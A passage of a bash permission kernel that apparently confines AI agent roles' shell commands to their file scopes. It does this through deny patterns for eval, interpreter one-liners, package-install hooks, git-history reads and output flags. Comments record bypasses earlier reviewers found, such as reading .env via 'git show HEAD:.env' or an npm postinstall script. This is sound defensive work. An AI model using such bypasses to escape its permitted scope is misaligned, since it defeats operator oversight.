      # Drop the wrapper word, then any following options / numeric
      # durations / KEY=VAL assignments that belong to it.
      seg=$(printf '%s' "$seg" | sed -E 's/^[a-z]+[[:space:]]+//')
      # Every alternative here stops at a redirection character. The twin
      # of this pattern at the top of the loop was hardened in round 3 and
      # this one was missed, so `env X=1<.env cat` still had its whole
      # redirection eaten before any check ran. The redirect scan now
      # reads SEG_RAW instead, but the read-token scan still runs on
      # $seg — so this must not swallow syntax either.
      # The wrapper loop strips assignments too — `env NODE_OPTIONS=… cmd`
      # reaches this one, not the leading strip — so the same screen runs
      # here. Round 3 had to fix the redirect-swallowing defect twice for
      # exactly this reason.
      # Flags first, THEN screen, then the assignments. Stripping both in
      # one pass hid `env -i NODE_OPTIONS=… cmd` from the screen, because
      # the anchored scan for assignments saw the `-i` and stopped.
      seg=$(printf '%s' "$seg" | sed -E 's/^((-[^[:space:]<>|&]+|[0-9]+[smhd]?)[[:space:]]+)*//')
      screen_env_assignments "$seg"
      seg=$(printf '%s' "$seg" | sed -E 's/^((-[^[:space:]<>|&]+|[0-9]+[smhd]?|[A-Za-z_][A-Za-z0-9_]*=[^[:space:]<>|&]*)[[:space:]]+)*//')
      [ -n "$seg" ] || break
    done
    [ -n "$seg" ] || continue

    # Quote-stripped word list for the segment — what the shell will treat
    # as the command word and its operands.
    SEG_WORDS=()
    while IFS= read -r __w; do
      [ -n "$__w" ] || continue
      SEG_WORDS+=("${__w#?}")
    done < <(printf '%s\n' "$seg" | harness_os_shell_words)

    # 3a-bis. Version-control history is a second copy of the working
    # tree, and every path scope in this kernel is expressed against the
    # working tree. `git show HEAD:.env` reads the file out of the object
    # store: no operand names `.env` as an existing path, so the read-token
    # scan below never sees it, and the secret is printed. A reviewer used
    # exactly that to defeat a read-only role's scope.
    #
    # So content-bearing git subcommands are held to the read scope the
    # same way any other read is:
    #   * a `<rev>:<path>` operand is scope-checked on its <path>;
    #   * pathspecs after `--` are scope-checked;
    #   * a command with no path constraint at all reads whatever the
    #     history holds, which cannot be scope-checked, so it is denied as
    #     the construct 'vcs-history' (permit it per role if a role's job
    #     really is reading history wholesale).
    # Metadata-only forms (`git log` without a patch flag, `--stat`,
    # `--name-only`, `git status`, `git rev-parse`…) print no file content
    # and stay untouched — this must not become the axis that makes git
    # unusable.
    # `harness-os run --role X` installs role X's runtime profile. A role
    # invoking it with someone ELSE's name borrows that role's scopes —
    # and a command group written loosely (`^harness-os run\b`) permits
    # exactly that, which is a shape an operator will write. The kernel
    # knows both names, so it does not need to rely on the pattern being
    # tight: the only profile a role may install is its own.
    if [ "${SEG_WORDS[0]:-}" = "harness-os" ] \
       || { [ "${SEG_WORDS[0]:-}" = "npx" ] && [ "${SEG_WORDS[1]:-}" = "harness-os" ]; }; then
      HOS_SUB=""; HOS_RUN_ROLE=""; __want_role=0
      for __w in "${SEG_WORDS[@]}"; do
        if [ "$__want_role" = "1" ]; then HOS_RUN_ROLE="$__w"; __want_role=0; continue; fi
        case "$__w" in
          --role) __want_role=1 ;;
          --role=*) HOS_RUN_ROLE="${__w#*=}" ;;
          run) [ -n "$HOS_SUB" ] || HOS_SUB=run ;;
        esac
      done
      if [ "$HOS_SUB" = "run" ] && [ -n "$HOS_RUN_ROLE" ] && [ "$HOS_RUN_ROLE" != "$ROLE" ]; then
        harness_os_deny "run-role-mismatch $HOS_RUN_ROLE" "[BLOCKED] Role '${ROLE}' may not run a command under role '${HOS_RUN_ROLE}'s runtime profile.

${ROLE_HEADER}

Command: ${CMD}

'harness-os run --role X' installs X's path scopes as the process's permission profile. Invoking it with another role's name borrows that role's scopes — which would make the runtime profile a way around the boundary rather than part of it. A role may only install its own:

  harness-os run --role ${ROLE} -- <command>"
      fi
    fi

    GIT_CONTENT=0
    GIT_ANCHOR=""
    if [ "${SEG_WORDS[0]:-}" = "git" ]; then
      # Find the subcommand. Global options come first, and some of them
      # TAKE A VALUE — `git -c core.pager=cat show …` would otherwise be
      # read as the subcommand 'core.pager=cat' and sail past this axis.
      GIT_SUB=""
      GIT_SKIP_NEXT=0
      for __i in "${!SEG_WORDS[@]}"; do
        [ "$__i" = "0" ] && continue
        __w="${SEG_WORDS[$__i]}"
        if [ "$GIT_SKIP_NEXT" = "1" ]; then
          GIT_SKIP_NEXT=0
          [ -n "$GIT_ANCHOR" ] || { case "${SEG_WORDS[$((__i - 1))]}" in -C) GIT_ANCHOR="$__w" ;; esac; }
          continue
        fi
        case "$__w" in
          -C|-c|--git-dir|--work-tree|--namespace|--exec-path|--super-prefix|--config-env)
            GIT_SKIP_NEXT=1; continue ;;
          --git-dir=*) GIT_ANCHOR="${__w#*=}"; continue ;;
          --work-tree=*) GIT_ANCHOR="${__w#*=}"; continue ;;
          -*) continue ;;                    # valueless global option
          *) GIT_SUB="$__w"; break ;;
        esac
      done
      # -C/--git-dir/--work-tree re-anchor the repository the same way `cd`
      # re-anchors relative paths: every scope check below assumes the
      # project this call runs in. A no-op anchor is fine; anything else is
      # denied for the same reason a real `cd` is.
      if [ -n "$GIT_ANCHOR" ] && [ "$BASH_UNRESTRICTED" != "true" ]; then
        GIT_ANCHOR_N=$(harness_os_normalize_path "$GIT_ANCHOR")
        if [ "$GIT_ANCHOR_N" != "$(harness_os_normalize_path "$HOS_CWD")" ] \
           && [ "$GIT_ANCHOR_N" != "$(harness_os_normalize_path "$HOS_CWD/.git")" ] \
           && ! { [ "$BASH_PERMIT" != "null" ] && printf '%s' "$BASH_PERMIT" | "$JQ" -e 'index("cd") != null' >/dev/null 2>&1; }; then
          harness_os_deny "bash-builtin-deny:cd" "[BLOCKED] Role '${ROLE}' pointed git at a different repository ('$GIT_ANCHOR') — that re-anchors every path this role's scopes are expressed against.

${ROLE_HEADER}

Command: ${CMD}

A role's read and write scopes are relative to the project it is governed in. Run git against that project (drop -C/--git-dir/--work-tree, or point them at the current directory)."
        fi
      fi
      GIT_PATCHY=0
      case " ${SEG_WORDS[*]} " in *' -p '*|*' -u '*|*' --patch '*|*' --patch-with-stat '*) GIT_PATCHY=1 ;; esac
      GIT_NAMESONLY=0
      case " ${SEG_WORDS[*]} " in
        *' --stat '*|*' --name-only '*|*' --name-status '*|*' --numstat '*|*' --shortstat '*|*' -s '*|*' --quiet '*|*' --summary '*) GIT_NAMESONLY=1 ;;
      esac
      case "$GIT_SUB" in
        show|diff|cat-file|archive|grep|blame|format-patch|diff-tree|diff-index)
          GIT_CONTENT=1 ;;
        log|stash|whatchanged)
          [ "$GIT_PATCHY" = "1" ] && GIT_CONTENT=1 ;;
      esac
      # An explicit names-only/stat request prints no file bodies.
      [ "$GIT_NAMESONLY" = "1" ] && [ "$GIT_PATCHY" = "0" ] && GIT_CONTENT=0
    fi
    if [ "$GIT_CONTENT" = "1" ] && [ "$READ_ALLOW" != "null" ]; then
      GIT_CONSTRAINED=0
      GIT_DDASH=0
      for __w in "${SEG_WORDS[@]:1}"; do
        if [ "$__w" = "--" ]; then GIT_DDASH=1; continue; fi
        GIT_PATHS=()
        if [ "$GIT_DDASH" = "1" ]; then
          GIT_PATHS+=("$__w")
        else
          case "$__w" in
            -*) continue ;;
            *://*) continue ;;
            *:*) GIT_PATHS+=("${__w#*:}") ;;   # <rev>:<path> and :<path>
            *)   # a bare operand that IS an existing path is a pathspec;
                 # the read-token scan below scope-checks it for us.
                 if [ -e "$HOS_CWD/$__w" ] || { case "$__w" in /*) [ -e "$__w" ] ;; *) false ;; esac; }; then
                   GIT_CONSTRAINED=1
                 fi
                 continue ;;
          esac
        fi
        for __p in "${GIT_PATHS[@]}"; do
          [ -n "$__p" ] || continue
          GIT_CONSTRAINED=1
          harness_os_is_manifest_path "$__p" && continue
          GIT_REL=$(harness_os_relpath "$__p")
          if [ "$READ_DENY" != "null" ] && harness_os_path_in_scope "$GIT_REL" "$READ_DENY"; then :
          elif harness_os_path_in_scope "$GIT_REL" "$READ_ALLOW"; then continue
          elif [ "$HAS_WRITE_GRANTS" = "1" ] && harness_os_path_in_scope "$GIT_REL" "$WRITE_ALLOW"; then continue
          fi
          harness_os_deny "bash-read-out-of-scope $GIT_REL" "[BLOCKED] Role '${ROLE}' may not read '$GIT_REL' out of git history — it is outside the role's read scope.

${ROLE_HEADER}
read scope: $(printf '%s' "$READ_ALLOW" | "$JQ" -r 'join(", ")' 2>/dev/null)

Command: ${CMD}

Git history holds a second copy of the working tree, so 'git show <rev>:<path>' is a read of <path> and is scope-checked identically. The scope is the role's context diet, whichever channel does the reading."
        done
      done
      if [ "$GIT_CONSTRAINED" = "0" ] && [ "$BASH_UNRESTRICTED" != "true" ] \
         && ! { [ "$BASH_PERMIT" != "null" ] && printf '%s' "$BASH_PERMIT" | "$JQ" -e 'index("vcs-history") != null' >/dev/null 2>&1; }; then
        harness_os_deny "bash-builtin-deny:vcs-history" "[BLOCKED] Role '${ROLE}' may not run '${GIT_SUB}' without naming the paths it reads — it would print file contents from git history that no path scope can check.

${ROLE_HEADER}
read scope: $(printf '%s' "$READ_ALLOW" | "$JQ" -r 'join(", ")' 2>/dev/null)

Command: ${CMD}

NOTE: your command group DOES grant 'git ${GIT_SUB}'. This refusal is a construct deny that overrides it, not a missing grant — so adding another command pattern will not help. Git history is a second copy of the working tree, so an unconstrained 'git ${GIT_SUB}' reads whatever the history holds — including files this role's read scope excludes. Options, narrowest first:
  1. Name the paths: git ${GIT_SUB} … -- <path within the read scope>
     (or 'git show <rev>:<path>'), which is scope-checked like any read.
  2. Ask for names, not contents: --stat / --name-only / --name-status.
  3. If reading history wholesale really is this role's job, the operator
     can permit exactly that construct:
       \"bash\": { \"permit\": [\"vcs-history\"] }
     Every other construct, and every other axis, still applies."
      fi
    fi

    # 3a. Built-in indirection denies. Each of these constructs lets a
    # segment that MATCHES an allow pattern execute something that was
    # never checked ($(…) and $VAR indirection, `| sh`, find -exec,
    # xargs, interpreter one-liners, cd un-anchoring every relative
    # path, brace expansion concealing a filename). No allow pattern can
    # be safe alongside them, so they are denied by default for every
    # governed role.
    #
    # Each construct has an ID, and a role may PERMIT specific ones via
    # bash.permit (e.g. ["var-expansion"] for a role that legitimately
    # needs "$HOME"). That granularity is deliberate: an all-or-nothing
    # hatch invites a blanket waiver the first time a legitimate command
    # is denied, which is how a guardrail dies. bash.unrestricted remains
    # for a fully trusted role.
    CD_NOOP=0
    if [ "$BASH_UNRESTRICTED" != "true" ]; then
      BUILTIN_HIT=""
      BUILTIN_ID=""
      if printf '%s' "$SEG_NOSQ" | grep -q '\$'; then BUILTIN_ID='var-expansion'; BUILTIN_HIT='variable/command substitution ($…) — expansion executes or reads things no pattern checked'
      elif printf '%s' "$SEG_NOSQ" | grep -q '`'; then BUILTIN_ID='command-substitution'; BUILTIN_HIT='backtick command substitution'
      elif printf '%s' "$SEG_NOQ" | grep -Eq '<\(|>\('; then BUILTIN_ID='process-substitution'; BUILTIN_HIT='process substitution <(…)/>(…)'
      elif printf '%s' "$seg" | grep -Eq '(^|[[:space:]])eval([[:space:]]|$)'; then BUILTIN_ID='eval'; BUILTIN_HIT='eval'
      elif printf '%s' "$seg" | grep -Eq '(^|[[:space:]])xargs([[:space:]]|$)'; then BUILTIN_ID='xargs'; BUILTIN_HIT='xargs — arguments become an unchecked command'
      elif printf '%s' "$seg" | grep -Eq '^(source[[:space:]]|\.[[:space:]])'; then BUILTIN_ID='source'; BUILTIN_HIT='sourcing a script into the shell'
      elif printf '%s' "$seg" | grep -Eq '^(ba|z|da|k|fi)?sh([[:space:]]|$)'; then BUILTIN_ID='shell'; BUILTIN_HIT='a shell as the command — its input becomes an unchecked script'
      elif printf '%s' "$seg" | grep -Eq -- '-exec(dir)?([[:space:]]|$)|-delete([[:space:]]|$)'; then BUILTIN_ID='find-exec'; BUILTIN_HIT='find -exec/-execdir/-delete — executes/deletes outside the pattern check'
      # A SEARCH TOOL WITH A PREPROCESSOR IS A SEARCH TOOL THAT EXECS.
      # `rg --pre <prog>` runs <prog> on every file ripgrep is about to
      # search and reads its stdout instead of the file. Round 44 found
      # it sitting inside the benchmark's own `inspection` group, where
      # `rg` is granted for what it obviously is — a reader. It is
      # `find -exec` under a different flag, and it was not on this list
      # for the ordinary reason: the list is an enumeration, and the
      # entry arrives on the tool author's release schedule rather than
      # this kernel's. `--pre-glob` only narrows which files the
      # preprocessor sees, so it is the same channel.
      #
      # Latent as shipped, and the reviewer said so precisely: the
      # inspector cannot author the preprocessor and ripgrep passes it
      # no attacker-controlled argument. Closed anyway, because "the
      # payload half is missing" is a description of today's manifests,
      # not of the boundary.
      elif printf '%s' "$seg" | grep -Eq -- '(^|[[:space:]])--pre(-glob)?([[:space:]]|=)'; then BUILTIN_ID='search-preprocessor'; BUILTIN_HIT='rg --pre/--pre-glob — a preprocessor program run on every matched file, outside every pattern check'
      elif [ "$(harness_os_interpreter_inline "${SEG_WORDS[0]:-}" "$seg")" = "module" ]; then BUILTIN_ID='interpreter-module'; BUILTIN_HIT='running or preloading a module (-m/-M/-r) — code this kernel never sees, though the role did not author it'
      elif [ "$(harness_os_interpreter_inline "${SEG_WORDS[0]:-}" "$seg")" = "indirect" ]; then BUILTIN_ID='interpreter-inline'; BUILTIN_HIT='interpreter one-liner (-c/-e/-p and their attached and bundled spellings, or a program on stdin) — arbitrary code the patterns cannot see'
      elif [ "$(harness_os_awk_sed_verdict "${SEG_WORDS[0]:-}" "$seg")" = "indirect" ]; then
        # awk and sed belong in this list beside `python -c`, and for the
        # same reason: they are interpreters, and their program can run a
        # command (`system()`, `cmd | getline`, `print | cmd`, sed's `e`)
        # or open a file (`getline < f`, `print > f`, sed's `r`/`w`).
        # A role granted either held an unrestricted shell while its
        # manifest said otherwise.
        #
        # The first version of this screened those constructs and
        # scope-checked the literal beside them, so an in-scope path
        # passed. That is unsound, and a reviewer showed it in eleven
        # characters: put the literal in a variable and every pattern
        # sees nothing, because the operand is an arbitrary expression.
        # Round 8 had already ruled on this exact shape — a channel that
        # turns data into execution must be closed, not pattern-matched —
        # and this is the second time that ruling had to be learned.
        #
        # So inert is what must be proved, and anything else is refused
        # whatever it names. Roles that genuinely need the constructs opt
        # in through bash.permit, like every other entry here.
        # A stable id per LANGUAGE, not per binary name: a manifest that
        # permits `awk-program` must keep working when the role reaches
        # for gawk or mawk, and an operator should not have to guess
        # which spelling their machine will use.
        case "${SEG_WORDS[0]:-}" in
          sed) BUILTIN_ID='sed-program' ;;
          *)   BUILTIN_ID='awk-program' ;;
        esac
        BUILTIN_HIT="an ${SEG_WORDS[0]:-awk} program using a construct that can run a command or open a file — its operand is an arbitrary expression, so no scan can say which"
      elif printf '%s' "$seg" | grep -Eq '^(cd|pushd|popd)([[:space:]]|$)'; then
        # `cd <dir> && <cmd>` is how agents habitually prefix a command,
        # and when <dir> IS the directory the call already runs in, the
        # cd changes nothing: every relative path in the later segments
        # still resolves exactly where this axis assumes. Allowing that
        # no-op removes the single largest source of false denies with
        # zero loss of soundness — a cd anywhere ELSE would re-anchor
        # relative paths away from the checked cwd, so it stays denied.
        # Take the cd target only from the FIRST word, and only when the
        # segment is a bare `cd <dir>` (optionally with redirects) — the
        # rest of the segment still faces every other check below.
        CD_TARGET=$(printf '%s' "$seg" | sed -E 's/^(cd|pushd|popd)[[:space:]]+//; s/[[:space:]].*$//' | tr -d '"'"'")
        if [ -n "$CD_TARGET" ] && [ "$(harness_os_normalize_path "$CD_TARGET")" = "$(harness_os_normalize_path "$HOS_CWD")" ]; then
          # A no-op cd re-anchors nothing, so it needs no allow pattern.
          # It is NOT a free pass for the segment: `cd . > secrets` still
          # writes a file, so only the construct + allow-set checks are
          # waived here — the redirect and read-token analysis below runs
          # on this segment exactly as it would on any other.
          CD_NOOP=1
          BUILTIN_ID=''; BUILTIN_HIT=''
        else
          BUILTIN_ID='cd'; BUILTIN_HIT='cd/pushd/popd to a different directory — it re-anchors every relative path this axis checks (a cd to the directory you are already in is allowed)'
        fi
      elif printf '%s' "$SEG_NOQ" | grep -Eq '\{[^{}[:space:]]*,[^{}[:space:]]*\}?|\{[^{}[:space:]]*\.\.[^{}[:space:]]*\}?'; then BUILTIN_ID='brace-expansion'; BUILTIN_HIT='brace expansion {a,b} or {a..z} — the shell expands it into filenames no check ever sees'
      # A DEPENDENCY-INSTALL OR BUILD VERB IS AN INTERPRETER WEARING A
      # BUILD HAT, and round 31 is the round that noticed nobody had said
      # so. It found the escape in a manifest this project SHIPS — the
      # `feature-dev` template's implementer, whose `build` group grants
      # `npm install`:
      #
      #   Write src/evil/package.json   {"scripts":{"postinstall":"node p.js"}}
      #   Write src/evil/p.js           reads ../../.env, writes /tmp
      #   Bash  npm install ./src/evil
      #
      # Three ordinary grants, every step ALLOW, and the role's read and
      # write scopes are both gone. Nothing here defeats a check: the
      # package manager runs the DEPENDENCY's lifecycle script, so the
      # authored-code screen has nothing to screen (the file imports
      # nothing) and no path scope ever sees the read.
      #
      # This project already learned, on the interpreter axis in rounds 8
      # and 16, that a channel which turns data into execution must be
      # CLOSED rather than pattern-matched. `npm install`, `pip install`,
      # `make`, `gradle` are that same channel; the lesson migrated
      # across grep, sed, awk and jq and never reached the package
      # managers, because they look like build tooling instead of like an
      # interpreter. A command group is a regex over argv: it can say how
      # a command is SPELLED and knows nothing about what it is CAPABLE
      # of, so `^npm .*install\b` reads as narrow and is not.
      #
      # Note this one cannot be fixed by routing it through
      # `harness-os run` either — npm needs --allow-child-process, and a
      # postinstall that shells out leaves the permission model entirely.
      # Permitting it is a real decision, so it is spelled as one.
      elif printf '%s' "$SEG_NOQ" | grep -Eq '^[[:space:]]*(npm|pnpm|yarn|bun)[[:space:]]+(i|in|install|ci|add|update|upgrade|link|rebuild|exec[[:space:]]+--package)\b'; then
        BUILTIN_ID='dependency-install'; BUILTIN_HIT='a package-manager install verb — it executes the lifecycle scripts of whatever it installs, which is arbitrary code no path scope and no authored-code screen ever sees'
      elif printf '%s' "$SEG_NOQ" | grep -Eq '^[[:space:]]*(pip|pip3|python[0-9.]*[[:space:]]+-m[[:space:]]+pip|gem|cargo|go|composer|bundle|apt|apt-get|apk|brew|dnf|yum|nix-env)[[:space:]]+(install|add|require|get)\b'; then
        BUILTIN_ID='dependency-install'; BUILTIN_HIT='a package-manager install verb — it executes setup code from whatever it installs, which is arbitrary code no path scope and no authored-code screen ever sees'
      elif printf '%s' "$SEG_NOQ" | grep -Eq '^[[:space:]]*(make|gmake|gradle|gradlew|\./gradlew|mvn|ant|rake|just|task|cmake)\b'; then
        BUILTIN_ID='build-recipe'; BUILTIN_HIT='a build-recipe runner — it executes commands from a Makefile or build script, so what it runs is decided by a file rather than by this command'
      fi
      # A permitted construct is skipped — the segment still faces the
      # allow-set, deny patterns, redirect scope and read-token checks.
      if [ -n "$BUILTIN_ID" ] && [ "$BASH_PERMIT" != "null" ] \
         && printf '%s' "$BASH_PERMIT" | "$JQ" -e --arg c "$BUILTIN_ID" 'index($c) != null' >/dev/null 2>&1; then
        BUILTIN_HIT=""
      fi
      if [ -n "$BUILTIN_HIT" ]; then
        harness_os_deny "bash-builtin-deny:${BUILTIN_ID}" "[BLOCKED] Role '${ROLE}' may not run this command — the segment '$seg' uses ${BUILTIN_HIT}.

${ROLE_HEADER}

Command: ${CMD}

These constructs are denied by default because they let a command that matches an allow pattern do something the pattern never checked. Options, narrowest first:
  1. Express the operation directly — one plain command per step, granted tools for file writes.
  2. If this role legitimately needs this construct, the operator can permit exactly it:
       \"bash\": { \"permit\": [\"${BUILTIN_ID}\"] }
     Every other construct stays denied, and the allow-set, redirect-scope
     and read-scope checks still apply to this role.
  3. bash.unrestricted: true waives all of them — for a deliberately
     trusted role only, never to silence a single deny.

Preview the effect before you commit to it: harness-os explain --role ${ROLE} --tool Bash --command '<the command>'"
      fi
    fi

    # 3b. Explicit deny patterns beat the allow check — a deliberately
    # denied shape deserves the specific message even when it also
    # fails the allow set.
    while IFS= read -r pat; do
      [ -n "$pat" ] || continue
      if printf '%s' "$seg" | grep -Eq "$pat"; then
        harness_os_deny "bash-segment-denied" "[BLOCKED] Role '${ROLE}' is explicitly denied this command shape (segment '$seg' matches deny pattern '$pat').

${ROLE_HEADER}

Command: ${CMD}"
      fi
    done <<< "$DENY_PATTERNS"

    # 3c. Allow set: every segment must be inside the role's command
    # groups (skipped when the role has no bash section at all, and for a
    # no-op cd, which executes nothing for a pattern to authorize — its
    # redirects and file tokens are still checked below).
    if [ "$BASH_SPEC" != "null" ] && [ "$BASH_UNRESTRICTED" != "true" ] && [ "$CD_NOOP" != "1" ]; then
      SEG_OK=0
      while IFS= read -r pat; do
        [ -n "$pat" ] || continue
        if printf '%s' "$seg" | grep -Eq "$pat"; then SEG_OK=1; break; fi
      done <<< "$ALLOW_PATTERNS"
      if [ "$SEG_OK" != "1" ]; then
        harness_os_deny "bash-segment-not-allowed" "[BLOCKED] Role '${ROLE}' may not run this command — the segment '$seg' matches none of the role's permitted command patterns.

${ROLE_HEADER}

Command: ${CMD}

Note: compound commands are checked segment-by-segment (&&, ||, ;, |, &, newlines) and every segment must be within the role's command groups. If this operation is part of your mandate, ask the operator to extend the role's commandGroups in the manifest; otherwise hand it back to the orchestrator."
      fi
    fi

    # 3c-bis. INPUT redirection is a read channel. `cat <.env` never
    # names .env as an argument, so the token scan below cannot see it —
    # but the shell still opens and reads the file. Every `<` target is
    # therefore scoped against read.allow exactly like a named file.
    # (`<<`/`<<<` are here-docs/here-strings: their operand is inline
    # text, not a path, so only a single `<` is treated as a file read.)
    if [ "$READ_ALLOW" != "null" ]; then
      IN_TARGETS=$(printf '%s' "$SEG_REDIR" | grep -oE '(^|[^<])<[[:space:]]*[^[:space:]<>;&|]+' 2>/dev/null \
        | sed -E 's/^[^<]?<[[:space:]]*//' || true)
      while IFS= read -r intarget; do
        [ -n "$intarget" ] || continue
        intarget=$(printf '%s' "$intarget" | tr -d '"'"'" | tr -d '\001')
        [ -n "$intarget" ] || continue
        case "$intarget" in *://*) continue ;; esac
        harness_os_is_manifest_path "$intarget" && continue
        REL_IN=$(harness_os_relpath "$intarget")
        if { [ "$READ_DENY" != "null" ] && harness_os_path_in_scope "$REL_IN" "$READ_DENY"; } \
           || { ! harness_os_path_in_scope "$REL_IN" "$READ_ALLOW" \
                && { [ "$HAS_WRITE_GRANTS" != "1" ] || ! harness_os_path_in_scope "$REL_IN" "$WRITE_ALLOW"; }; }; then
          harness_os_deny "bash-input-redirect-out-of-scope $REL_IN" "[BLOCKED] Role '${ROLE}' may not read '$REL_IN' — this command redirects it onto a command's standard input, and input redirection is held to the same read scope as naming the file.

${ROLE_HEADER}
read scope: $(printf '%s' "$READ_ALLOW" | "$JQ" -r 'join(", ")' 2>/dev/null)

Command: ${CMD}"
        fi
      done <<< "$IN_TARGETS"
    fi

    # 3d. Redirect / tee write targets. A '>' that survived the
    # fd-noise mask is a real file write: a role with no write grants
    # may not perform it at all, and a role WITH write grants may only
    # aim it inside its write scope — bash must not launder writes past
    # the Write/Edit axis for anyone.
    REDIR_TARGETS=$(printf '%s' "$SEG_REDIR" | grep -oE '>>?[[:space:]]*[^[:space:]<>;&]+' 2>/dev/null | sed -E 's/^>>?[[:space:]]*//' || true)
    if [ "${SEG_WORDS[0]:-}" = "tee" ]; then
      TEE_TARGETS=$(printf '%s\n' "${SEG_WORDS[@]:1}" | grep -vE '^-' || true)
      REDIR_TARGETS=$(printf '%s\n%s' "$REDIR_TARGETS" "$TEE_TARGETS")
    fi
    # Redirection is not the only way a command writes. `cp a b`,
    # `mv a b`, `dd of=b`, `install a b`, `sed -i f`, `truncate f`,
    # `ln -s t l` all create or overwrite files, and a role whose command
    # group includes any of them (ordinary for a build role) could
    # otherwise write anywhere — a reviewer proved it by planting a new
    # file in the kernel's own install directory. Their DESTINATION
    # operand is held to the write scope like a redirect target.
    # Output-FLAG operands, matched generically rather than per verb.
    # Enumerating write verbs kept losing to the next tool: rounds 2 and 3
    # found cp/mv/dd/install/sed -i, then `sort -o`, then
    # `find -fprintf` — the last of which overwrote the manifest and took
    # the kernel over. Any `-o/--output/-fprint*/-fls/--out` operand is
    # treated as a write target regardless of which command carries it,
    # so a new tool with the same convention is covered on arrival.
    #
    # `-o` is the one that cannot be matched blindly: it means "output
    # file" to sort and the compilers, but "or" to find and "only-matching"
    # to grep. Reading `find tests -name '*.json' -o -name '*.ts'` as a
    # write to a file called "-name" is exactly the kind of nonsense deny
    # that gets a gate switched off, so `-o`/`-O` count only for commands
    # that spell output that way. The unambiguous spellings
    # (--output, -fprintf, …) need no such list.
    FLAG_TARGETS=""
    __fw=0
    for __i in "${!SEG_WORDS[@]}"; do
      [ "$__i" = "0" ] && continue
      __w="${SEG_WORDS[$__i]}"
      if [ "$__fw" = "1" ]; then FLAG_TARGETS="${FLAG_TARGETS}${__w}"$'\n'; __fw=0; continue; fi
      case "$__w" in
        --output=*|--out=*|--output-file=*|-of=*) FLAG_TARGETS="${FLAG_TARGETS}${__w#*=}"$'\n' ;;
        --output|--out|--output-file|-of|-fprintf|-fprint|-fprint0|-fls) __fw=1 ;;
        # `curl` writes files through eight more flags than `-o`, and none
        # of them is a `>` redirect or a mutate verb, so the destination
        # reached neither this table nor the self-protection axis. A
        # read-only role wrote anywhere with `curl … -D <path>` — and
        # aimed at the manifest, that is the root of trust overwritten by
        # a role holding no write grant at all. These spellings are
        # unambiguous across tools, so they need no command list.
        --dump-header=*|--trace=*|--trace-ascii=*|--cookie-jar=*|--etag-save=*|--stderr=*|--output-dir=*|--append-output=*)
          FLAG_TARGETS="${FLAG_TARGETS}${__w#*=}"$'\n' ;;
        --dump-header|--trace|--trace-ascii|--cookie-jar|--etag-save|--stderr|--output-dir|--append-output)
          __fw=1 ;;
        -D|-c)
          # Ambiguous elsewhere (`-c` counts for grep, `-D` defines for
          # the compilers), so these two are curl's alone.
          case "${SEG_WORDS[0]}" in curl) __fw=1 ;; esac ;;
        -D?*|-c?*)
          case "${SEG_WORDS[0]}" in curl) FLAG_TARGETS="${FLAG_TARGETS}${__w#-?}"$'\n' ;; esac ;;
        # Playwright's own file-writing flags. `codegen`/`open` are a
        # browser driver, not a test runner: `--save-har`, `--save-storage`
        # and `--save-trace` each write a path, and a HAR of a
        # `file:///…/.env` navigation contains the file. Round 32 used
        # exactly that to give a role with NO write grants both an
        # out-of-scope write and a secret read in one granted command.
        # Unambiguous spellings, so no command list.
        --save-har=*|--save-storage=*|--save-trace=*|--save-har-glob=*)
          FLAG_TARGETS="${FLAG_TARGETS}${__w#*=}"$'\n' ;;
        --save-har|--save-storage|--save-trace)
          __fw=1 ;;
        -o|-O)
          # INVERTED after round 32. This was a list of commands whose
          # `-o` names a file, and playwright was not on it, so
          # `playwright codegen -o docs/x.js` wrote where
          # `--output docs/x.js` was refused — the same command, the same
          # file, two spellings, one checked. Enumerating the tools whose
          # `-o` is an output was always going to lose to the next tool,
          # and architecture.md already said the generic spellings need
          # no list. It says it about this one now too.
          #
          # So the list is the other way round: `-o` takes a path UNLESS
          # the command is one of the few where it means something else
          # — grep's only-matching, find's OR. Everything unknown is
          # treated as a write, which is the safe direction, and the
          # scope check below is what decides whether it matters.
          case "$__w:${SEG_WORDS[0]}" in
            # `-O` is an OUTPUT for a couple of downloaders and an
            # OPTIMISATION level for every interpreter and compiler
            # (`python -OO`, `cc -O2`), so it keeps a list where `-o`
            # loses one. Inverting the wrong one of the two turns
            # `python3 -OO script.py` into a write of a file called `O`.
            -O:wget|-O:curl|-O:aria2c) __fw=1 ;;
            -O:*) : ;;
            *:grep|*:egrep|*:fgrep|*:rgrep|*:rg|*:ag|*:ack|*:ack-grep|*:find|*:nm|*:ps|*:du|*:df|*:stty|*:sox) : ;;
            *) __fw=1 ;;
          esac ;;
        -o*|-O*)
          # The attached spelling carries the SAME rule as the separated
          # one, or `sort -opackage.json` writes where `sort -o
          # package.json` is refused — round 12's split, on the write
          # side. A remainder that is not a path costs nothing: the
          # existence and scope checks downstream decide.
          case "$__w:${SEG_WORDS[0]}" in
            -O*:wget|-O*:curl|-O*:aria2c) FLAG_TARGETS="${FLAG_TARGETS}${__w#-?}"$'\n' ;;
            -O*:*) : ;;
            *:grep|*:egrep|*:fgrep|*:rgrep|*:rg|*:ag|*:ack|*:ack-grep|*:find|*:nm|*:ps|*:du|*:df|*:stty|*:sox) : ;;
            *) FLAG_TARGETS="${FLAG_TARGETS}${__w#-?}"$'\n' ;;
          esac ;;
      esac
    done
    # Archive tools name their output in ways no output-flag spelling
    # covers. `tar -cf out.tar .` clusters the `f` with the mode letter,
    # so it matches none of the arms above; `tar cf out.tar .` drops the
    # dash entirely; and `zip out.zip files…` puts the archive in the
    # first positional. Each creates a file, and because that file does
    # not exist yet the read-token scan cannot see it either — the
    # existence test that keeps this scan quiet is exactly what hides a
    # write.
    #
    # This is the flag-cluster lesson again, on a third spelling: `-cf`
    # is `-f` with company. It is modelled per-tool because the operand's
    # ROLE differs by mode — the archive of `tar -c` is written, the
    # archive of `tar -x` is read — and no generic rule can tell those
    # apart from the token alone.
    case "${SEG_WORDS[0]:-}" in
      tar|bsdtar|gtar)
        __tf=0
        for __i in "${!SEG_WORDS[@]}"; do
          [ "$__i" = "0" ] && continue
          __w="${SEG_WORDS[$__i]}"
          if [ "$__tf" = "1" ]; then FLAG_TARGETS="${FLAG_TARGETS}${__w}"$'\n'; __tf=0; continue; fi
          case "$__w" in
            --file=*) FLAG_TARGETS="${FLAG_TARGETS}${__w#*=}"$'\n' ;;
            --file) __tf=1 ;;
            # A cluster containing `f`, with or without the leading dash
            # (`tar cf`, `tar -czf`). The archive follows the cluster;
            # attached to it when more characters come after the `f`.
            -*f|-*f*|[a-zA-Z]*f|[a-zA-Z]*f*)
              case "$__w" in
                -*|[a-zA-Z]*)
                  __rest="${__w##*f}"
